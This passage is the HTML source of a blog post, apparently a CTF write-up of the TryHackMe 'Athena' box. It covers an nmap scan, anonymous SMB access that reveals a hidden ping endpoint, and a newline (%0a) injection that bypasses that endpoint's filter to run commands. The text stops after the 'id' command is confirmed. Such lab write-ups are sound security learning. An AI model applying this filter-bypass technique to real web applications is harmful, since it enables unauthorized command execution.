@@ -1,0 +1,1962 @@
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"
+><head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#0e174e" />
+  
+  <title>Athena — TryHackMe &middot; k40t1k</title>
+    <meta name="title" content="Athena — TryHackMe &middot; k40t1k" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="https://k40tik.github.io/js/appearance.min.8a082f81b27f3cb2ee528df0b0bdc39787034cf2cc34d4669fbc9977c929023c.js"
+    integrity="sha256-iggvgbJ/PLLuUo3wsL3Dl4cDTPLMNNRmn7yZd8kpAjw="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="https://k40tik.github.io/css/main.bundle.min.77a79972dfd1fba3e37eaab972e5cf479aea24376fc39d827f5760735ebc834e.css"
+    integrity="sha256-d6eZct/R&#43;6Pjfqq5cuXPR5rqJDdvw52Cf1dgc168g04="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        
+      
+    "
+  />
+  
+  
+  
+  
+    <link rel="canonical" href="https://k40tik.github.io/posts/athena-tryhackme/" />
+  
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="https://k40tik.github.io/posts/athena-tryhackme/">
+	<meta property="og:site_name" content="k40t1k">
+	<meta property="og:title" content="Athena — TryHackMe">
+	<meta property="og:description" content="My awesome website">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-07-25T19:35:00+03:00">
+		<meta property="article:modified_time" content="2026-07-25T19:35:00+03:00">
+		<meta property="article:tag" content="TryHackMe">
+		<meta property="article:tag" content="Linux">
+		<meta property="article:tag" content="SMB">
+		<meta property="article:tag" content="Command Injection">
+		<meta property="article:tag" content="Privilege Escalation">
+		<meta property="article:tag" content="Kernel Module">
+		<meta property="og:image" content="https://k40tik.github.io/posts/athena-tryhackme/feature.png">
+
+  
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:image" content="https://k40tik.github.io/posts/athena-tryhackme/feature.png">
+	<meta name="twitter:title" content="Athena — TryHackMe">
+	<meta name="twitter:description" content="My awesome website">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog",
+    "name": "Athena — TryHackMe",
+    "headline": "Athena — TryHackMe",
+    
+    
+    "inLanguage": "en",
+    "url" : "https:\/\/k40tik.github.io\/posts\/athena-tryhackme\/",
+    "author" : {
+      "@type": "Person",
+      "name": "k40t1k"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-07-25T19:35:00\u002b03:00",
+    "datePublished": "2026-07-25T19:35:00\u002b03:00",
+    
+    "dateModified": "2026-07-25T19:35:00\u002b03:00",
+    
+    "keywords": ["TryHackMe","Linux","SMB","Command Injection","Privilege Escalation","Kernel Module","Diamorphine","CTF Writeup"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "766"
+  }
+  </script>
+    
+    <script type="application/ld+json">
+    {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "https://k40tik.github.io/",
+       "name": "K40t1k",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "https://k40tik.github.io/posts/",
+       "name": "Blog",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "name": "Athena — Try Hack Me",
+       "position": 3
+     }
+   ]
+ }
+  </script>
+
+  
+  
+    <meta name="author" content="k40t1k" />
+  
+  
+    
+      <link href="https://github.com/jkilonzi" rel="me" />
+    
+      <link href="https://linkedin.com/in/john-maluki" rel="me" />
+    
+      <link href="https://medium.com/@jkilonzi301" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  
+
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >k40t1k</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/about/"
+                  title="About"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >About</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/posts/"
+                  title="Blog"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/resources/"
+                  title="Resources"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Resources</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/certificates/"
+                  title="Certificates"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Certificates</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Athena — TryHackMe
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-07-25 19:35:00 &#43;0300 EAT">25 July 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+        <div class="prose">
+          
+          
+          
+          
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mb-6 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/athena-tryhackme/feature_hu_a9e9bb5b9e763971.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="645"
+        height="137"
+        class="mb-6 rounded-md"
+        
+        
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/feature.png"
+        
+      />
+    </picture>
+  
+
+
+          
+        </div>
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8 self-start">
+          <div class="toc pe-5 sticky top-20 overflow-y-auto max-h-[calc(100vh-6rem)] print:hidden">
+            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5">
+  <summary
+    class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#step-1-reconnaissance-and-enumeration">Step 1: Reconnaissance and Enumeration</a>
+      <ul>
+        <li><a href="#smb-enumeration">SMB Enumeration</a></li>
+        <li><a href="#discovering-the-endpoint">Discovering the Endpoint</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-2-initial-access">Step 2: Initial Access</a>
+      <ul>
+        <li><a href="#exploiting-the-discovered-endpoint">Exploiting the Discovered Endpoint</a></li>
+        <li><a href="#command-injection">Command Injection</a></li>
+        <li><a href="#establishing-a-reverse-shell">Establishing a Reverse Shell</a></li>
+        <li><a href="#shell-stabilization">Shell Stabilization</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-3-internal-enumeration">Step 3: Internal Enumeration</a>
+      <ul>
+        <li><a href="#user-enumeration">User Enumeration</a></li>
+        <li><a href="#discovering-the-backup-script">Discovering the Backup Script</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-4-lateral-movement">Step 4: Lateral Movement</a></li>
+    <li><a href="#step-5-privilege-escalation">Step 5: Privilege Escalation</a>
+      <ul>
+        <li><a href="#analyzing-the-kernel-module">Analyzing the Kernel Module</a></li>
+        <li><a href="#triggering-the-rootkit">Triggering the Rootkit</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <h2 id="overview" class="relative group">Overview <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#overview" aria-label="Anchor">#</a></span></h2><p>This writeup details the attack path taken to compromise the Athena box from TryHackMe. The attack chain began with SMB anonymous access discovery, leading to credential and endpoint leakage. A command injection vulnerability on a custom web application was exploited to gain initial access. Lateral movement was achieved by abusing a scheduled backup script, and root was obtained by triggering a hidden function in a kernel rootkit (Diamorphine) via a specific signal.</p>
+<h2 id="step-1-reconnaissance-and-enumeration" class="relative group">Step 1: Reconnaissance and Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-1-reconnaissance-and-enumeration" aria-label="Anchor">#</a></span></h2><p>The assessment began with an nmap scan against the target to identify running services and potential entry points.</p>
+<pre tabindex="0"><code>nmap -sV -sC -p- &lt;target-ip&gt;
+</code></pre><pre tabindex="0"><code>PORT    STATE SERVICE     REASON         VERSION
+80/tcp  open  http        syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
+139/tcp open  netbios-ssn syn-ack ttl 62 Samba smbd 4
+445/tcp open  netbios-ssn syn-ack ttl 62 Samba smbd 4
+</code></pre><p><strong>Key Findings:</strong></p>
+<ul>
+<li>Three open ports identified: HTTP (80), NetBIOS (139), and SMB (445).</li>
+<li>The hostname was identified as ROUTERPANEL via NetBIOS enumeration.</li>
+<li>SMB message signing was enabled but not required.</li>
+<li>No Conficker infection detected.</li>
+</ul>
+<p>The web server on port 80 displayed a simple landing page with no significant functionality.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/athena-tryhackme/website-homepage_hu_e3cf481ea76d6978.webp 330w,https://k40tik.github.io/posts/athena-tryhackme/website-homepage_hu_1c1a328df81c32f4.webp 660w
+            
+              ,https://k40tik.github.io/posts/athena-tryhackme/website-homepage_hu_c813f2ed096de6fb.webp 1024w
+            
+            
+              ,https://k40tik.github.io/posts/athena-tryhackme/website-homepage_hu_c4749ad7c116a030.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1489"
+        height="616"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/website-homepage_hu_3b2e9c9adac3a7fb.png" srcset="https://k40tik.github.io/posts/athena-tryhackme/website-homepage_hu_fa4ea4d5861d5478.png 330w,https://k40tik.github.io/posts/athena-tryhackme/website-homepage_hu_3b2e9c9adac3a7fb.png 660w
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/website-homepage_hu_9cf938bec694eda7.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/website-homepage_hu_7d09dc1a9ebb8a49.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="smb-enumeration" class="relative group">SMB Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#smb-enumeration" aria-label="Anchor">#</a></span></h3><p>SMB enumeration revealed that the server allowed <strong>anonymous access</strong>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/athena-tryhackme/smb-anonymous-access_hu_13232d1ab747594b.webp 330w,https://k40tik.github.io/posts/athena-tryhackme/smb-anonymous-access_hu_abd36dec165c96aa.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/smb-anonymous-access_hu_31a21b009a64708c.webp 939w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/smb-anonymous-access_hu_31a21b009a64708c.webp 939w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="939"
+        height="81"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/smb-anonymous-access_hu_78727ba81c1ffbcf.png" srcset="https://k40tik.github.io/posts/athena-tryhackme/smb-anonymous-access_hu_f4726981a2be5155.png 330w,https://k40tik.github.io/posts/athena-tryhackme/smb-anonymous-access_hu_78727ba81c1ffbcf.png 660w
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/smb-anonymous-access.png 939w
+          
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/smb-anonymous-access.png 939w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Listing the available shares using tools like <strong>smbclient</strong>, <strong>enum4linux-ng</strong>, or <strong>nxc</strong> showed accessible directories including a public share.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/athena-tryhackme/smb-shares_hu_3a7446a4bf65dbd9.webp 330w,https://k40tik.github.io/posts/athena-tryhackme/smb-shares_hu_1adc1aef865a0224.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/smb-shares_hu_9a74e34246fcdfb5.webp 932w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/smb-shares_hu_9a74e34246fcdfb5.webp 932w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="932"
+        height="167"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/smb-shares_hu_5496e3a9c53ca782.png" srcset="https://k40tik.github.io/posts/athena-tryhackme/smb-shares_hu_bc1017a460b592bd.png 330w,https://k40tik.github.io/posts/athena-tryhackme/smb-shares_hu_5496e3a9c53ca782.png 660w
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/smb-shares.png 932w
+          
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/smb-shares.png 932w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="discovering-the-endpoint" class="relative group">Discovering the Endpoint <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#discovering-the-endpoint" aria-label="Anchor">#</a></span></h3><p>Within the public SMB share, a file was recovered containing a message directed at the admin. This file revealed a hidden web endpoint.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/athena-tryhackme/smb-file-message_hu_c4b24209d513f34.webp 330w,https://k40tik.github.io/posts/athena-tryhackme/smb-file-message_hu_e5b981db1f8c0fc7.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/smb-file-message_hu_31ad3009de4cdd06.webp 674w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/smb-file-message_hu_31ad3009de4cdd06.webp 674w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="674"
+        height="194"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/smb-file-message_hu_259325dc7650c636.png" srcset="https://k40tik.github.io/posts/athena-tryhackme/smb-file-message_hu_3a07a2bba345767f.png 330w,https://k40tik.github.io/posts/athena-tryhackme/smb-file-message_hu_259325dc7650c636.png 660w
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/smb-file-message.png 674w
+          
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/smb-file-message.png 674w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/athena-tryhackme/smb-endpoint-reveal_hu_845b27af49da4ffb.webp 330w,https://k40tik.github.io/posts/athena-tryhackme/smb-endpoint-reveal_hu_35ee72e426311194.webp 660w
+            
+              ,https://k40tik.github.io/posts/athena-tryhackme/smb-endpoint-reveal_hu_3d4f081b9c78f262.webp 1024w
+            
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/smb-endpoint-reveal_hu_a6b1e63e30ca7be3.webp 1046w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1046"
+        height="162"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/smb-endpoint-reveal_hu_5115270de961305e.png" srcset="https://k40tik.github.io/posts/athena-tryhackme/smb-endpoint-reveal_hu_2f80c49ded821a59.png 330w,https://k40tik.github.io/posts/athena-tryhackme/smb-endpoint-reveal_hu_5115270de961305e.png 660w
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/smb-endpoint-reveal_hu_4a18830344e2baa6.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/smb-endpoint-reveal.png 1046w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-2-initial-access" class="relative group">Step 2: Initial Access <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-2-initial-access" aria-label="Anchor">#</a></span></h2><h3 id="exploiting-the-discovered-endpoint" class="relative group">Exploiting the Discovered Endpoint <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploiting-the-discovered-endpoint" aria-label="Anchor">#</a></span></h3><p>Navigating to the newly discovered endpoint on the web application revealed a ping utility.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/athena-tryhackme/ping-endpoint_hu_2a099e83295f5860.webp 330w,https://k40tik.github.io/posts/athena-tryhackme/ping-endpoint_hu_96d24d2b51c396ba.webp 660w
+            
+              ,https://k40tik.github.io/posts/athena-tryhackme/ping-endpoint_hu_c17d3401f0f47c51.webp 1024w
+            
+            
+              ,https://k40tik.github.io/posts/athena-tryhackme/ping-endpoint_hu_fcc3963e70fb1929.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1811"
+        height="490"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/ping-endpoint_hu_a3cb092a918c475f.png" srcset="https://k40tik.github.io/posts/athena-tryhackme/ping-endpoint_hu_ac77430139f627e.png 330w,https://k40tik.github.io/posts/athena-tryhackme/ping-endpoint_hu_a3cb092a918c475f.png 660w
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/ping-endpoint_hu_1534293007101992.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/ping-endpoint_hu_4bafd0bfadcd05a2.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The ping utility was tested by pinging Google to confirm its functionality.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/athena-tryhackme/ping-google_hu_4eb6de3906430494.webp 330w,https://k40tik.github.io/posts/athena-tryhackme/ping-google_hu_f447c88f580a67ec.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/ping-google_hu_de533c4de6d3a916.webp 885w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/ping-google_hu_de533c4de6d3a916.webp 885w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="885"
+        height="132"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/ping-google_hu_ee0707e18e3188d8.png" srcset="https://k40tik.github.io/posts/athena-tryhackme/ping-google_hu_b0ac39f3ca21c5d4.png 330w,https://k40tik.github.io/posts/athena-tryhackme/ping-google_hu_ee0707e18e3188d8.png 660w
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/ping-google.png 885w
+          
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/ping-google.png 885w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="command-injection" class="relative group">Command Injection <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#command-injection" aria-label="Anchor">#</a></span></h3><p>Attempting to inject OS commands into the ping parameter triggered a basic input filter, blocking the payload.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/athena-tryhackme/injection-detected_hu_2e9808e1fd555c73.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="412"
+        height="64"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/injection-detected.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Switching to <strong>curl</strong> for more granular control over the request allowed bypassing client-side restrictions.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/athena-tryhackme/curl-attempt_hu_9f94e73da01a4421.webp 330w,https://k40tik.github.io/posts/athena-tryhackme/curl-attempt_hu_bb9b66e64a1ab8a5.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/curl-attempt_hu_dde6473d3a4f65e9.webp 789w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/curl-attempt_hu_dde6473d3a4f65e9.webp 789w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="789"
+        height="186"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/curl-attempt_hu_b82d782d3f53708b.png" srcset="https://k40tik.github.io/posts/athena-tryhackme/curl-attempt_hu_b13d0e9f275c892b.png 330w,https://k40tik.github.io/posts/athena-tryhackme/curl-attempt_hu_b82d782d3f53708b.png 660w
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/curl-attempt.png 789w
+          
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/curl-attempt.png 789w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>After multiple input attempts yielded no results, a <strong>newline character (<code>%0a</code>)</strong> injection was tested. Using URL-encoded newline characters successfully bypassed the filter and achieved command execution.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/athena-tryhackme/newline-bypass_hu_7fccf03dc9ccb79.webp 330w,https://k40tik.github.io/posts/athena-tryhackme/newline-bypass_hu_e641e61e787de8ff.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/newline-bypass_hu_b4a27429fc228d24.webp 740w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/newline-bypass_hu_b4a27429fc228d24.webp 740w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="740"
+        height="61"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/newline-bypass_hu_2252d000a83b0cc2.png" srcset="https://k40tik.github.io/posts/athena-tryhackme/newline-bypass_hu_c967b686376892f5.png 330w,https://k40tik.github.io/posts/athena-tryhackme/newline-bypass_hu_2252d000a83b0cc2.png 660w
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/newline-bypass.png 740w
+          
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/newline-bypass.png 740w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The <code>id</code> command was successfully executed, confirming command injection.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/athena-tryhackme/id-command-success_hu_b41d00655cf48e66.webp 330w,https://k40tik.github.io/posts/athena-tryhackme/id-command-success_hu_cc108eff320e1ca5.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/id-command-success_hu_a51b624b573f7199.webp 795w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/id-command-success_hu_a51b624b573f7199.webp 795w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="795"
+        height="203"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/id-command-success_hu_364875ded34baaec.png" srcset="https://k40tik.github.io/posts/athena-tryhackme/id-command-success_hu_957e22df6638e6fe.png 330w,https://k40tik.github.io/posts/athena-tryhackme/id-command-success_hu_364875ded34baaec.png 660w
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/id-command-success.png 795w
+          
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/id-command-success.png 795w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
